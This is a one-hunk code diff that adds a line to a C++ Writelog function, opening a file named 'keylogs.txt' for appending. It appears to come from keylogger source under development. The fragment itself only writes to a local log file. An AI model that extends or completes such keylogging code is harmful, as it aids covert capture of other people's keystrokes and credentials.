@@ -7,3 +7,4 @@ using namespace std;
 
 void Writelog(LPCSTR text){
     ofstream logfile;
+	logfile.open("keylogs.txt", fstream::app);
